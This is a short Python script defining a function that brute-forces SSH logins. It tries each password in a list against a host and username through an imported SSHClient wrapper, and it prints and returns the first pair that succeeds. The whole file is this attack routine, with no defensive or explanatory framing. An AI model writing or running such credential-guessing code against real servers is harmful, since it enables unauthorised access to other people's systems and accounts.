from ssh_client import SSHClient

def ssh_bruteforce(host, username, passwords):
    for password in passwords:
        client = SSHClient(host, username, password)
        result = client.try_login()

        if result is True:
            print(f"[+] Login found {username}:{password}")
            client.close()
            return username, password

        elif result is False:
            print(f"[-] Fail: {username}:{password}")

        else:
            print("[!] Connection error")

        client.close()
        
    return None